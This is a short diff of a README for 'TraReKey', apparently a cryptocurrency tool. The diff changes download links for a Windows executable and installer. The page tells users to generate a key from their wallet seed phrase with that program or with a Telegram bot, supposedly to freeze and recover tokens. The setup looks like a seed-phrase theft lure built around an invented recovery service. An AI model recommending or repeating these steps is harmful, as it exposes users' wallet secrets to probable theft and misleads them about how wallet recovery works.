@@ -14,8 +14,8 @@
 
 ## Downloads From Site
 - **Standalone Windows Version**:
-  - [TraReKey_0.1.0_x64.exe (11 MB)](https://trarekey.org/TraReKey_0.1.0_x64.exe)
-  - [TraReKey_0.1.0_x64_en-US.msi (5 MB)](https://trarekey.org/Trarekey_Generator_0.1.0_x64_en-US.msi)
+  - [TraReKey_0.1.0_x64.exe (11 MB)](https://trarekey.org/download/TraReKey_0.1.0_x64.exe)
+  - [TraReKey_0.1.0_x64_en-US.msi (5 MB)](https://trarekey.org/download/Trarekey_Generator_0.1.0_x64_en-US.msi)
 ---
 
 ## Key Features
@@ -63,7 +63,7 @@ Upon validation, frozen funds are returned to the sender’s wallet.
 **TraReKey** is a unique cryptographic identifier generated from the user's seed phrase. It ensures secure verification for token freezing and recovery operations.
 
 ### **Generation Methods**
-1. **Local Application**: Use the [TraReKey Generator(Windows)](https://trarekey.org/TraReKey_0.1.0_x64.exe) for secure, offline generation.
+1. **Local Application**: Use the [TraReKey Generator(Windows)](https://trarekey.org/download/TraReKey_0.1.0_x64.exe) for secure, offline generation.
 2. **Web-Based or [Telegram Bot](https://t.me/TrarekeyBot)**: Less secure; use cautiously.
 
 ### **Process**
